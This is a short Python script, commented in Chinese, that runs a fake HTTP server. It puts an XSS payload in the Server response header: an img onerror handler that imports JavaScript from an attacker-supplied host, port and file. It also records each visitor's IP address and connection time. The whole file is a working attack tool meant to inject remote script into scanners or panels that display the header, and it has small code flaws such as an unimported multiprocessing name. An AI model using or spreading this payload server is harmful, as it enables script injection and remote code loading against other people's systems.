# coding:utf-8

import socket
import time
import sys

from multiprocessing import Process


def handle_client(client_socket):
    """
    处理客户端请求
    """
    try:
        request_data = client_socket.recv(1024)
    except Exception as e:
        print(e)
    print("request data:", request_data)
    # 构造响应数据
    response_start_line = "HTTP/1.1 200 OK\r\n"
    response_headers = "Server: Nginx/<img	src=1	onerror=import(unescape('http%3A{0}%3A{1}/{2}'))>\r\n".format(sys.argv[1],sys.argv[2],sys.argv[3])    #  payload
    response_body = "<head><title>test</title><body>test api</body></head>"
    response = response_start_line + response_headers + "\r\n" + response_body

    # 向客户端返回响应数据
    try:
        client_socket.send(bytes(response, "utf-8"))
    except Exception as e:
        print(e)

    # 关闭客户端连接
    client_socket.close()


if __name__ == "__main__":
    multiprocessing.freeze_support() 
    while len(sys.argv) == 5:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind(("", int(sys.argv[4])))   # 端口
        server_socket.listen(128)
        try:
            client_socket, client_address = server_socket.accept()
            localtime = time.asctime( time.localtime(time.time()) )
            st=time.strftime("%Y%m%d",time.localtime())
            with open("note"+st+".txt",'a+', encoding='utf-8') as f:
                f.write('ip和端口：' + str(client_address) + '\n')
                f.write('用户访问具体时间为' + localtime + '\n')
            print("[%s, %s]用户连接上了" % client_address)
            print("连接时间为 :", localtime)
            handle_client_process = Process(target=handle_client, args=(client_socket,))
            handle_client_process.start()
            client_socket.close()
        except ValueError:
            print("出现异常")

    print("帮助说明：\n需要输入4个参数，顺序分别是ip 端口 js文件 想要开放服务的端口\n如 python3 fz.py 192.168.50.177 80 test.js 888")

